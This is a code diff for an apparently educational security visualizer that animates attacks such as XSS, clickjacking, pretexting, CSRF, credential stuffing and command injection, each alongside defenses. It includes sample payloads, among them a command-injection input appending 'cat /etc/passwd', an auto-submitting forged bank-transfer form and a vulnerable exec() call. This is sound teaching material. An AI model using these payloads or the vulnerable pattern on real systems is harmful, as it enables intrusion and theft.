+          </div>
+          <div class="b-body" id="xss-body">
+            <div style="font-size:13px;font-weight:700;margin-bottom:8px">Comments (3)</div>
+            <div class="cmt-item"><div class="cmt-ava">😊</div><div><div class="cmt-name">Alice</div><div class="cmt-txt">Great article!</div></div></div>
+            <div class="cmt-item"><div class="cmt-ava" style="background:var(--red-s)">🦹</div><div><div class="cmt-name" style="color:var(--red)">Attacker</div><div class="cmt-txt bad">&lt;script&gt;…&lt;/script&gt;</div></div></div>
+          </div>
+        </div>
+        <div id="xss-popup"></div>
+        <div class="callout red" id="xss-callout" style="display:none">🦹 Attacker just received: <strong style="font-family:var(--fm)">session_id=abc123def456</strong></div>
+      </div>`,
+      init(viz){
+        const popup = viz.querySelector('#xss-popup');
+        const callout = viz.querySelector('#xss-callout');
+        kt(setTimeout(()=>{
+          popup.innerHTML = `<div class="alert-popup">
+            <div class="alert-title">JavaScript Alert</div>
+            <div class="alert-msg">session_id=abc123def456</div>
+            <div class="alert-btn">OK</div>
+          </div>`;
+          kt(setTimeout(()=>{ if(callout) callout.style.display='block'; },600));
+        },800));
+      }
+    }
+  ]
+},
+
+// ── 6. BUFFER OVERFLOW ────────────────────────────────────────────
+{
+  id:'bufov', capec:'CAPEC-100', title:'Buffer Overflow',
+  category:'Memory', catColor:'#7c3aed', difficulty:3,
+  icon:'💾', tagline:'Writing more data to a memory buffer than it can hold, corrupting adjacent memory.',
+  steps:[
+    { title:'How Memory Is Laid Out',
+      desc:'Programs allocate fixed-size chunks of memory called <strong><span class="term" data-tip="A buffer is a reserved block of memory set aside to temporarily hold data — like a bucket with a fixed size. Problems arise when you try to pour in more data than the bucket can hold.">buffers</span></strong>. Adjacent to a buffer you might find other variables, the saved frame pointer, and the <strong><span class="term" data-tip="The return address is a value stored in memory that tells the CPU: \'when this function is done, jump back here.\' Overwriting it lets an attacker redirect the program to run their own code instead.">return address</span></strong> — which tells the CPU where to go next after a function finishes.',
+      html:`<div class="buf-scene">
+        <div class="mem-section" style="border-color:var(--teal)">
+          <div class="mem-s-lbl" style="color:var(--teal)">Input Buffer (8 bytes)</div>
+          <div class="mem-cells">
+            ${Array(8).fill(0).map((_,i)=>`<div class="mc" id="mc-buf-${i}">—</div>`).join('')}
+          </div>
+        </div>
+        <div class="mem-section" style="border-color:var(--orange);margin-top:8px">
+          <div class="mem-s-lbl" style="color:var(--orange)">Return Address (4 bytes)</div>
+          <div class="mem-cells">
+            ${Array(4).fill(0).map((_,i)=>`<div class="mc ret" id="mc-ret-${i}">${['0x','40','11','20'][i]}</div>`).join('')}
+          </div>
+        </div>
+        <div class="callout acc">The return address tells the CPU: "when this function is done, jump back to this location." Overwriting it means redirecting program execution.</div>
+      </div>`
+    },
+    { title:'A Normal Input',
+      desc:'The program allocates an 8-byte buffer. You type "Hello" (5 characters). Each character fills one memory cell. The buffer has 3 slots left over, and the return address is untouched.',
+      html:`<div class="buf-scene">
+        <div class="mem-section" style="border-color:var(--teal)">
+          <div class="mem-s-lbl" style="color:var(--teal)">Input Buffer (8 bytes)</div>
+          <div class="mem-cells" id="mc-normal">
+            ${Array(8).fill(0).map((_,i)=>`<div class="mc" id="mcn-${i}">—</div>`).join('')}
+          </div>
+        </div>
+        <div class="mem-section" style="border-color:var(--orange);margin-top:8px">
+          <div class="mem-s-lbl" style="color:var(--orange)">Return Address (intact)</div>
+          <div class="mem-cells">
+            ${Array(4).fill(0).map((_,i)=>`<div class="mc ret">${['0x','40','11','20'][i]}</div>`).join('')}
+          </div>
+        </div>
+      </div>`,
+      init(viz){
+        const data = ['H','e','l','l','o'];
+        let i=0;
+        function fill(){
+          if(i>=data.length) return;
+          const mc = viz.querySelector(`#mcn-${i}`);
+          if(mc){ mc.textContent=data[i]; mc.classList.add('buf'); }
+          i++;
+          kt(setTimeout(fill, 250));
+        }
+        kt(setTimeout(fill,400));
+      }
+    },
+    { title:'Overflow!',
+      desc:'Now input 16 characters — more than the 8-byte buffer can hold. The program blindly keeps writing. After the buffer is full, data spills into the adjacent memory region, overwriting the return address with garbage.',
+      html:`<div class="buf-scene">
+        <div class="mem-section" style="border-color:var(--teal)">
+          <div class="mem-s-lbl" style="color:var(--teal)">Buffer — FULL</div>
+          <div class="mem-cells" id="mc-ov">
+            ${Array(8).fill(0).map((_,i)=>`<div class="mc" id="mco-${i}">—</div>`).join('')}
+          </div>
+        </div>
+        <div class="mem-section" style="border-color:var(--red);margin-top:8px">
+          <div class="mem-s-lbl" style="color:var(--red)">Return Address — OVERWRITTEN</div>
+          <div class="mem-cells" id="mc-ret-ov">
+            ${Array(4).fill(0).map((_,i)=>`<div class="mc ret" id="mcr-${i}">${['0x','40','11','20'][i]}</div>`).join('')}
+          </div>
+        </div>
+      </div>`,
+      init(viz){
+        const input = 'AAAAAAAAAAAAAAAA'.split('');
+        let i=0;
+        function fill(){
+          if(i>=input.length) return;
+          if(i<8){
+            const mc=viz.querySelector(`#mco-${i}`);
+            if(mc){ mc.textContent='A'; mc.classList.add('buf'); }
+          } else {
+            const ri=i-8;
+            if(ri<4){
+              const mc=viz.querySelector(`#mcr-${ri}`);
+              if(mc){ mc.textContent='A'; mc.classList.remove('ret'); mc.classList.add('ov'); }
+            }
+          }
+          i++;
+          kt(setTimeout(fill, 160));
+        }
+        kt(setTimeout(fill,400));
+      }
+    },
+    { title:'Controlling Execution',
+      desc:'A crafted overflow replaces the return address with the address of <em>attacker-controlled code</em>. When the function returns, instead of going back to the caller, the CPU jumps to the attacker\'s payload — <span class="term" data-tip="Shellcode is a tiny machine-code program injected into memory by an attacker. Its name comes from often opening a command shell, but it can do anything the running program is allowed to do.">shellcode</span> that can do anything the program can.',
+      html:`<div class="buf-scene">
+        <div class="mem-section" style="border-color:var(--teal)">
+          <div class="mem-s-lbl" style="color:var(--teal)">Buffer — Attacker shellcode</div>
+          <div class="mem-cells">
+            ${Array(8).fill(0).map((_,i)=>`<div class="mc own">${['\\x90','\\x90','\\x90','\\x90','\\x31','\\xc0','\\x50','\\x53'][i]}</div>`).join('')}
+          </div>
+        </div>
+        <div class="mem-section" style="border-color:var(--acc);margin-top:8px">
+          <div class="mem-s-lbl" style="color:var(--acc)">Return Address — Now points to shellcode</div>
+          <div class="mem-cells">
+            ${Array(4).fill(0).map((_,i)=>`<div class="mc own">${['0x','ff','e4','00'][i]}</div>`).join('')}
+          </div>
+        </div>
+        <div class="callout acc">Defenses: <strong><span class="term" data-tip="A stack canary is a secret value placed in memory just before the return address. If an overflow overwrites it, the program notices before the function returns and shuts down safely.">Stack canaries</span></strong> (detect overflows), <strong><span class="term" data-tip="ASLR (Address Space Layout Randomization) loads the program, heap, and stack at random memory locations each run. The attacker can\'t predict where to point the return address.">ASLR</span></strong> (randomize memory layout), <strong><span class="term" data-tip="DEP/NX (Data Execution Prevention / No-Execute) marks memory regions like the stack as non-executable — so even if shellcode is written there, the CPU refuses to run it.">DEP/NX</span></strong> (mark the stack non-executable). Modern systems use all three.</div>
+      </div>`
+    }
+  ]
+},
+
+// ── 7. CLICKJACKING ───────────────────────────────────────────────
+{
+  id:'click', capec:'CAPEC-103', title:'Clickjacking',
+  category:'Web', catColor:'#2563eb', difficulty:1,
+  icon:'🖱️', tagline:'2022 PayPal vulnerability: an invisible transfer-confirmation button overlaid on a harmless page tricked logged-in users into sending money to attackers.',
+  steps:[
+    { title:'A Harmless-Looking Game Page',
+      desc:'The victim visits what looks like a fun sweepstakes page. There\'s a big "Spin Now" button. Nothing seems wrong — but an invisible <span class="term" data-tip="An iframe (inline frame) embeds one webpage inside another. Attackers use them at near-zero opacity — fully invisible, but still clickable — to overlay a hidden action on top of a visible one.">iframe</span> is already loaded underneath it, pre-filled with a PayPal transfer to the attacker\'s account.',
+      html:`<div class="cj-scene">
+        <div class="cj-wrap" style="padding:18px;background:linear-gradient(135deg,#e8f5e9 0%,#e8eaf6 100%);border-radius:var(--rs);border:1.5px solid var(--bdr);text-align:center">
+          <div style="font-size:32px;margin-bottom:6px">🎡</div>
+          <div style="font-size:15px;font-weight:700;margin-bottom:4px;color:#1a1a2e">Spin to Win!</div>
+          <div style="font-size:12px;color:#555;margin-bottom:16px;line-height:1.5">You\'ve been selected for an exclusive reward.<br>Spin the wheel to reveal your prize!</div>
+          <div class="cj-btn-wrap">
+            <div class="cj-btn leg" style="padding:10px 28px;font-size:14px;border-radius:24px">🎯 Spin Now</div>
+            <div class="evil-overlay">
+              <div style="font-size:9px;font-weight:700;color:var(--red);letter-spacing:.05em">HIDDEN IFRAME</div>
+              <div class="pp-mini-btn">Confirm &amp; Send $500</div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:11px;color:var(--fgm);margin-top:10px;text-align:center">Looks like a harmless game — but there\'s something lurking under that button.</p>
+        <div class="cj-ctrl">
+          <label><input type="checkbox" class="cj-check" id="cj-toggle"> Reveal hidden PayPal layer</label>
+        </div>
+      </div>`,
+      init(viz){
+        viz.querySelector('#cj-toggle').addEventListener('change', function(){
+          const f = viz.querySelector('.evil-overlay');
+          if(f) f.classList.toggle('show', this.checked);
+        });
+      }
+    },
+    { title:'What\'s Inside the Invisible Frame',
+      desc:'The hidden iframe loads PayPal\'s real transfer endpoint. Because the victim is already logged in to PayPal, no password is needed — the form just needs one click to confirm. The attacker pre-fills the recipient and amount; the victim\'s session provides the authorization.',
+      html:`<div class="cj-scene">
+        <div style="display:flex;gap:14px;align-items:flex-start;flex-wrap:wrap">
+          <div style="flex:1;min-width:150px">
+            <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:var(--fgm);margin-bottom:6px">Outer page (visible to victim)</div>
+            <div style="padding:14px;background:linear-gradient(135deg,#e8f5e9 0%,#e8eaf6 100%);border-radius:var(--rs);border:1.5px solid var(--bdr);text-align:center">
+              <div style="font-size:22px;margin-bottom:4px">🎡</div>
+              <div style="font-size:12px;font-weight:700;margin-bottom:12px;color:#1a1a2e">Spin to Win!</div>
+              <div class="cj-btn-wrap">
+                <div class="cj-btn leg" style="border-radius:24px">🎯 Spin Now</div>
+                <div class="evil-overlay show">
+                  <div style="font-size:8px;font-weight:700;color:var(--red)">HIDDEN IFRAME</div>
+                  <div class="pp-mini-btn">Confirm &amp; Send $500</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div style="flex:1;min-width:150px">
+            <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:var(--fgm);margin-bottom:6px">Hidden iframe (opacity ≈ 0)</div>
+            <div class="pp-frame">
+              <div class="pp-logo-txt">Pay<span style="color:#009cde">Pal</span></div>
+              <div class="pp-lbl">From</div>
+              <div class="pp-val">victim@email.com &nbsp;✓ logged in</div>
+              <div class="pp-lbl">To</div>
+              <div class="pp-val">paypal@hacker.me</div>
+              <div class="pp-lbl">Amount</div>
+              <div class="pp-amt-big">$500.00</div>
+              <button class="pp-cta">Confirm &amp; Send</button>
+            </div>
+          </div>
+        </div>
+        <div class="callout red">The iframe is invisible but fully interactive. It\'s positioned so the PayPal "Confirm &amp; Send" button sits exactly where the victim will click "Spin Now."</div>
+      </div>`
+    },
+    { title:'One Click — $500 Gone',
+      desc:'The victim clicks "Spin Now." Their click passes through to the invisible PayPal button underneath. PayPal sees a valid, authenticated request — the victim\'s own session — and processes the transfer.',
+      html:`<div class="cj-scene">
+        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px">
+          <div style="flex:1;min-width:120px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs);padding:14px;text-align:center">
+            <div style="font-size:24px;margin-bottom:8px">🤔</div>
+            <div style="font-size:12px;font-weight:700;margin-bottom:4px">You Think:</div>
+            <div style="font-size:11px;color:var(--fg2);line-height:1.6">"I clicked<br><em>Spin Now</em>"</div>
+          </div>
+          <div style="display:flex;align-items:center;font-size:20px;color:var(--red);padding:0 4px">≠</div>
+          <div style="flex:1;min-width:120px;background:var(--red-s);border:1.5px solid var(--red);border-radius:var(--rs);padding:14px;text-align:center">
+            <div style="font-size:24px;margin-bottom:8px">💸</div>
+            <div style="font-size:12px;font-weight:700;color:var(--red);margin-bottom:4px">Reality:</div>
+            <div style="font-size:11px;color:var(--fg2);line-height:1.6">PayPal sent<br>$500 to<br>paypal@hacker.me</div>
+          </div>
+        </div>
+        <div class="pp-frame">
+          <div class="pp-logo-txt">Pay<span style="color:#009cde">Pal</span></div>
+          <div style="font-size:13px;font-weight:700;color:#008000;margin-bottom:4px">✓ Payment Sent</div>
+          <div style="font-size:11px;color:#555;line-height:1.6">$500.00 sent to paypal@hacker.me<br><span style="color:#999">Transaction ID: 7F3K-HACKED-9Q2</span></div>
+        </div>
+      </div>`
+    },
+    { title:'How PayPal Fixed It',
+      desc:'Security researchers disclosed this in 2022 via <a class="ref-link" href="https://hackerone.com/paypal" target="_blank" rel="noopener">HackerOne</a>. PayPal\'s fix combined frame-blocking headers with mandatory re-authentication for any money transfer — so even a clickjacked click can\'t complete without a password prompt. (<a class="ref-link" href="https://owasp.org/www-community/attacks/Clickjacking" target="_blank" rel="noopener">OWASP Clickjacking guide</a>)',
+      html:`<div class="vpad">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div style="background:#1a1828;border-radius:var(--rs);padding:14px;font-family:var(--fm);font-size:12px;line-height:1.9;color:#a9a5d6">
+<span style="color:#cba6f7">X-Frame-Options:</span> <span style="color:#a6e3a1">SAMEORIGIN</span>
+<span style="color:#585475">// blocks embedding by any other origin</span>
+<span style="color:#cba6f7">Content-Security-Policy:</span> <span style="color:#a6e3a1">frame-ancestors 'self'</span>
+          </div>
+          ${[
+            ['🚫','<span class="term" data-tip="X-Frame-Options is a response header a web server sends to tell browsers whether its pages can be embedded in an iframe. SAMEORIGIN means only the same website can embed it — no other sites can.">X-Frame-Options: SAMEORIGIN</span>','Prevents any cross-origin site from loading PayPal pages in an iframe. Browsers refuse to render the frame at all.'],
+            ['🔑','Re-auth for Transfers','High-value actions now require password re-entry or 2FA even mid-session — a clickjacked click alone can\'t authorize a transfer.'],
+            ['🛡️','SameSite=Strict Cookies','Prevents the browser from sending PayPal session cookies when the request originates from another site\'s iframe.'],
+          ].map(([ico,lbl,tip])=>`<div style="display:flex;align-items:flex-start;gap:10px;padding:10px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:18px">${ico}</span>
+            <div><div style="font-size:12px;font-weight:700;margin-bottom:2px">${lbl}</div>
+            <div style="font-size:12px;color:var(--fg2);line-height:1.5">${tip}</div></div>
+          </div>`).join('')}
+        </div>
+      </div>`
+    }
+  ]
+},
+
+// ── 8. SOCIAL ENGINEERING / PRETEXTING ───────────────────────────
+{
+  id:'social', capec:'CAPEC-407', title:'Pretexting',
+  category:'Social Eng.', catColor:'#d97706', difficulty:1,
+  icon:'🎭', tagline:'Creating a fabricated scenario (a "pretext") to manipulate someone into divulging sensitive information.',
+  steps:[
+    { title:'The Attacker Does Homework First',
+      desc:'Before making contact, the attacker harvests information about the target from public sources — LinkedIn, company websites, social media. The more specific the details, the more convincing the pretext.',
+      html:`<div class="se-scene">
+        <div style="font-size:13px;font-weight:600;margin-bottom:10px;color:var(--fg2)">🔍 OSINT gathered on target: Jordan, IT Dept, Acme Corp</div>
+        <div class="osint-grid">
+          <div class="osint-item"><div class="oi-lbl">Full Name</div><div class="oi-val">Jordan Smith</div></div>
+          <div class="osint-item"><div class="oi-lbl">Employer</div><div class="oi-val">Acme Corp — IT Dept</div></div>
+          <div class="osint-item"><div class="oi-lbl">Manager</div><div class="oi-val">Lisa Chen (LinkedIn)</div></div>
+          <div class="osint-item"><div class="oi-lbl">Office Location</div><div class="oi-val">Denver, CO</div></div>
+          <div class="osint-item"><div class="oi-lbl">Email Format</div><div class="oi-val">jsmith@acme.com</div></div>
+          <div class="osint-item"><div class="oi-lbl">Tech Stack</div><div class="oi-val">Okta SSO, Azure (job posts)</div></div>
+        </div>
+        <div class="callout org" style="margin-top:10px">None of this required any hacking. It's all publicly visible — and it's enough to impersonate a trusted insider.</div>
+      </div>`
+    },
+    { title:'The Call Begins',
+      desc:'The attacker calls Jordan\'s company, claiming to be from the IT helpdesk. Using the gathered OSINT, they sound completely legitimate — they know Jordan\'s name, manager, and location.',
+      html:`<div class="se-scene">
+        <div class="chat-log" id="chat-1">
+          <div class="msg them"><div class="msg-ava">🦹</div><div class="msg-bbl">Hi, this is Mike from the IT helpdesk. Can I speak with Jordan Smith in the Denver office?</div></div>
+          <div class="tactic">Tactic: Establishing false authority & identity</div>
+          <div class="msg you"><div class="msg-ava">😊</div><div class="msg-bbl">This is Jordan. What's going on?</div></div>
+          <div class="msg them"><div class="msg-ava">🦹</div><div class="msg-bbl">Hey Jordan — we're seeing some unusual Okta activity on your account. Lisa Chen flagged it. We need to verify a few things before it escalates.</div></div>
+          <div class="tactic">Tactic: Namedropping manager + urgency</div>
+          <div class="msg you"><div class="msg-ava">😊</div><div class="msg-bbl">Oh wow — okay, I haven't done anything weird. How can I help?</div></div>
+        </div>
+      </div>`
+    },
+    { title:'Building False Trust',
+      desc:'The attacker keeps demonstrating insider knowledge to build credibility. They reference real systems, real procedures, and real urgency. Each correct detail makes the victim less skeptical.',
+      html:`<div class="se-scene">
+        <div class="chat-log">
+          <div class="msg them"><div class="msg-ava">🦹</div><div class="msg-bbl">I'm showing logins from two locations in the last hour — Denver and then somewhere in Eastern Europe. We use Okta with Azure, right?</div></div>
+          <div class="tactic">Tactic: Demonstrating insider knowledge (from OSINT)</div>
+          <div class="msg you"><div class="msg-ava">😊</div><div class="msg-bbl">Yes, that's right. I definitely didn't log in from Europe...</div></div>
+          <div class="msg them"><div class="msg-ava">🦹</div><div class="msg-bbl">Exactly. That's what concerned us. I need to reset your session tokens. Can you verify your employee ID and current temp password so I can push the reset to the right account?</div></div>
+          <div class="tactic">Tactic: The ask — framed as procedure, not extraction</div>
+          <div class="msg you"><div class="msg-ava">😊</div><div class="msg-bbl">Of course. My ID is E-1042 and my password is...</div></div>
+        </div>
+        <div class="callout red" style="margin-top:8px">Jordan is about to hand over credentials to a complete stranger. The pretext was convincing enough to bypass all suspicion.</div>
+      </div>`
+    },
+    { title:'Recognizing and Resisting',
+      desc:'The scariest thing about pretexting is that it works on smart people. The defense isn\'t being suspicious of everyone — it\'s building organizational habits that make these attacks harder.',
+      html:`<div class="vpad">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          ${[
+            ['☎️','Call Back, Don\'t Call Forward','If someone calls asking for credentials, hang up and call the organization\'s official number to verify.'],
+            ['🚨','Helpdesk Will Never Ask for Your Password','Legitimate IT staff reset accounts without needing your current password. This is a universal red flag.'],
+            ['👥','Verify Out-of-Band','If Mike from IT texts you, call him on his known extension — don\'t trust the channel the attacker initiated.'],
+            ['🎓','Security Awareness Training','Employees who practice recognizing pretexts are far less susceptible. Simulation training > memos.'],
+          ].map(([ico,lbl,tip])=>`<div style="display:flex;align-items:flex-start;gap:10px;padding:10px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:18px">${ico}</span>
+            <div><div style="font-size:12px;font-weight:700;margin-bottom:2px">${lbl}</div>
+            <div style="font-size:12px;color:var(--fg2);line-height:1.5">${tip}</div></div>
+          </div>`).join('')}
+        </div>
+      </div>`
+    }
+  ]
+},
+
+,
+
+// ── 9. CROSS-SITE REQUEST FORGERY ────────────────────────────────
+{
+  id:'csrf', capec:'CAPEC-62', title:'Cross-Site Request Forgery',
+  category:'Web', catColor:'#2563eb', difficulty:2,
+  icon:'🔄', tagline:'Tricking your browser into sending authenticated requests to another site without your knowledge.',
+  steps:[
+    { title:'Cookies Travel Automatically',
+      desc:'When you log in, your browser stores a <span class="term" data-tip="A small file your browser stores to remember that you\'re logged in. Sent automatically with every subsequent request to that site.">session cookie</span>. Every future request to that site automatically includes the cookie — even requests triggered by another site you are visiting at the same time.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qkw">POST</span> /transfer <span class="qkw">HTTP/1.1</span>
+<span class="qcmt">Host: bank.example.com</span>
+<span class="qhi">Cookie: session=abc123secret   ← browser sends this automatically</span>
+<span class="qstr">amount=5000&to=attacker_account</span>
+        </div>
+        <div class="info-box">The server sees a fully authenticated request. It has no way to know who actually sent it.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'The Hidden Form Trap',
+      desc:'The attacker embeds an invisible form on a harmless-looking page. When you visit, it auto-submits immediately — your browser sends a real, cookie-authenticated request to your bank on the attacker\'s behalf.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt">&lt;!-- evil-site.example — victim never sees this form --&gt;</span>
+<span class="qkw">&lt;form</span> <span class="qstr">action</span>=<span class="qhi">"https://bank.example.com/transfer"</span>
+      <span class="qstr">method</span>=<span class="qstr">"POST"</span> <span class="qstr">id</span>=<span class="qstr">"f"</span>&gt;
+  <span class="qkw">&lt;input</span> <span class="qstr">type</span>=<span class="qstr">"hidden"</span> <span class="qstr">name</span>=<span class="qstr">"amount"</span> <span class="qstr">value</span>=<span class="qstr">"5000"</span>&gt;
+  <span class="qkw">&lt;input</span> <span class="qstr">type</span>=<span class="qstr">"hidden"</span> <span class="qstr">name</span>=<span class="qstr">"to"</span>     <span class="qstr">value</span>=<span class="qstr">"attacker"</span>&gt;
+<span class="qkw">&lt;/form&gt;</span>
+<span class="qkw">&lt;script&gt;</span><span class="qinj">document.getElementById('f').submit();</span><span class="qkw">&lt;/script&gt;</span>
+        </div>
+        <div class="callout red">The form is invisible and submits the moment the page loads. No click required.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: CSRF Tokens',
+      desc:'Modern frameworks embed a unique, random <span class="term" data-tip="A secret value the server places in every form. Forged cross-site requests can\'t include the right token because the attacker\'s page can\'t read your other site\'s HTML.">CSRF token</span> in every form. Because the attacker\'s page can\'t read the token (blocked by the browser\'s <span class="term" data-tip="A browser rule preventing a page on evil.com from reading data from bank.com. It stops cross-site JavaScript reads, but NOT cross-site form submissions — hence the need for CSRF tokens.">Same-Origin Policy</span>), forged requests are rejected. Also set <span class="term" data-tip="A cookie attribute that tells the browser to only send the cookie when navigating from the same site. SameSite=Strict prevents the cookie from being sent in cross-site form submissions at all.">SameSite=Strict</span> on session cookies.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt">&lt;!-- Legitimate form from bank.example.com --&gt;</span>
+<span class="qkw">&lt;input</span> <span class="qstr">type</span>=<span class="qstr">"hidden"</span> <span class="qstr">name</span>=<span class="qstr">"_csrf"</span>
+       <span class="qstr">value</span>=<span class="qhi">"x9kP2m...random...wR8tY"</span>&gt;
+<span class="qcmt">Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly</span>
+        </div>
+        <div class="callout grn">✅ The evil page can never read this token — without it, the bank rejects the request. SameSite=Strict cookies don\'t even travel on cross-site submissions.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 10. CREDENTIAL STUFFING ───────────────────────────────────────
+{
+  id:'credstuff', capec:'CAPEC-70', title:'Credential Stuffing',
+  category:'Credential', catColor:'#d97706', difficulty:2,
+  icon:'🗃️', tagline:'Replaying leaked username-password pairs from one breach across hundreds of other websites.',
+  steps:[
+    { title:'One Breach Feeds Many Attacks',
+      desc:'When any website is <span class="term" data-tip="A security incident where attackers steal data from a system — often millions of usernames and passwords.">breached</span>, the leaked credentials get sold on dark-web markets. Because ~65% of people reuse passwords, attackers test the same pairs on banking sites, email providers, and anywhere valuable.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="breach-row">
+          <div class="breach-box" style="background:var(--red-s);border-color:var(--red)">
+            <div style="font-weight:700;color:var(--red);margin-bottom:6px">📤 Leaked Database</div>
+            <div style="font-family:var(--fm);font-size:11px;line-height:1.9;color:var(--fg2)">alice@mail.com : pass1234<br>bob@mail.com : qwerty99<br>carol@mail.com : sunshine1<br><span style="color:var(--fgm)">…4.2 million more…</span></div>
+          </div>
+          <div style="font-size:22px;align-self:center;padding:0 4px">→</div>
+          <div class="breach-box" style="background:var(--orange-s);border-color:var(--orange)">
+            <div style="font-weight:700;color:var(--orange);margin-bottom:6px">🤖 Stuffing Bot</div>
+            <div style="font-size:11px;color:var(--fg2);line-height:1.6">Automated tool tries each pair on target sites — thousands per hour, randomizing IPs to evade blocks</div>
+          </div>
+        </div>
+        <div class="info-box">Password reuse is the vulnerability. The site being attacked was never breached — only a different site the user trusted was.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Spraying Across Many Sites',
+      desc:'The bot tries every credential pair across every valuable site in its target list. A single "retailer123" password might open the victim\'s email, cloud storage, or bank account.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="spray-grid" id="spray-grid">
+          <div class="spray-item" id="sp0">🏦<br>Bank</div>
+          <div class="spray-item" id="sp1">📧<br>Email</div>
+          <div class="spray-item" id="sp2">🛒<br>Shop</div>
+          <div class="spray-item" id="sp3">☁️<br>Cloud</div>
+          <div class="spray-item" id="sp4">🎮<br>Games</div>
+          <div class="spray-item" id="sp5">🏥<br>Health</div>
+        </div>
+        <div id="stuff-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:8px;font-family:var(--fm);font-size:11px;min-height:44px;line-height:1.8"></div>
+      </div>`,
+      init(viz){
+        const log=viz.querySelector('#stuff-log');
+        const phases=[
+          {id:'sp0',res:'FAIL',cls:'fail',msg:'🏦 Bank: alice@mail.com — FAIL'},
+          {id:'sp1',res:'WIN',cls:'win',msg:'📧 Email: alice@mail.com — ✓ SUCCESS! Inbox compromised'},
+          {id:'sp2',res:'FAIL',cls:'fail',msg:'🛒 Shop: alice@mail.com — FAIL'},
+          {id:'sp3',res:'WIN',cls:'win',msg:'☁️ Cloud: carol@mail.com — ✓ SUCCESS! Files exposed'},
+        ];
+        let i=0;
+        function next(){
+          if(i>=phases.length) return;
+          const {id,cls,msg}=phases[i];
+          viz.querySelector('#'+id).className='spray-item '+cls;
+          log.innerHTML+=`<span style="color:${cls==='win'?'var(--green)':'var(--fgm)'}">${msg}</span><br>`;
+          log.scrollTop=log.scrollHeight; i++;
+          kt(setTimeout(next,1100));
+        }
+        kt(setTimeout(next,500));
+      }
+    },
+    { title:'Defense: Unique Passwords & MFA',
+      desc:'Credential stuffing only works because of password reuse. A <span class="term" data-tip="A tool that generates and stores a different, random password for every website — so you only need to remember one master password.">password manager</span> creates a unique password per site, so one leak doesn\'t cascade. <span class="term" data-tip="MFA requires a second proof beyond a password — like a code sent to your phone. Even if Mallory captures your password, she still can\'t log in without your second factor.">MFA</span> means even correct passwords aren\'t enough.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Password manager — unique passwords per site isolate breaches<br><br>✅ MFA everywhere possible — stolen password alone is useless<br><br>✅ Sites should implement <strong>rate limiting</strong>, CAPTCHA, and check logins against breach databases (Have I Been Pwned API)</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 11. OS COMMAND INJECTION ──────────────────────────────────────
+{
+  id:'cmdinj', capec:'CAPEC-88', title:'OS Command Injection',
+  category:'Injection', catColor:'#dc2626', difficulty:2,
+  icon:'💻', tagline:'Piggybacking system-level commands onto user input to execute arbitrary code on the server.',
+  steps:[
+    { title:'Server-Side Shell Commands',
+      desc:'Web apps often run system commands behind the scenes — a network ping tool, image converter, or PDF generator. The app builds the command string and passes it to the OS shell.',
+      html:`<div class="sql-scene">
+        <div class="mock-form"><h4>🌐 Network Diagnostic</h4>
+          <div class="fld"><label>Hostname</label><div class="fi">google.com</div></div>
+        </div>
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt"># What the server runs:</span>
+<span class="qkw">ping</span> <span class="qstr">-c 4</span> <span class="qhi">google.com</span>
+        </div>
+      </div>`,
+      init(){}
+    },
+    { title:'Chaining Commands with Shell Metacharacters',
+      desc:'Shell characters like <code class="ic">;</code>, <code class="ic">|</code>, and <code class="ic">&&</code> tell the shell to run another command right after the first. By injecting these into the input, an attacker appends their own arbitrary command.',
+      html:`<div class="sql-scene">
+        <div class="mock-form"><h4>🌐 Network Diagnostic</h4>
+          <div class="fld"><label>Hostname</label>
+            <div class="fi">google.com<span style="color:var(--orange)">;</span><span style="color:var(--red)"> cat /etc/passwd</span></div>
+          </div>
+        </div>
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt"># Server now runs both:</span>
+<span class="qkw">ping</span> <span class="qstr">-c 4</span> google.com<span class="qinj">; cat /etc/passwd</span>
+        </div>
+        <div class="callout red">The <code class="ic">;</code> is the pivot point. Everything after it is a brand-new command the server runs with full web-server privileges.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Separate Arguments from the Shell',
+      desc:'The fix is to never let user input touch a shell string. Use APIs that pass arguments as a list (not via the shell), validate input against a strict <span class="term" data-tip="An allowlist only permits known-safe values. Everything else is rejected by default — the opposite of a blocklist, which tries to ban known-bad values but is always incomplete.">allowlist</span>, and run server processes with the least privilege needed.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt">// ❌ Vulnerable — input ends up in a shell string:</span>
+<span class="qinj">exec('ping -c 4 ' + userInput)    // shell sees the ; !</span>
+
+<span class="qcmt">// ✅ Safe — arguments passed as a separate list, never shell-parsed:</span>
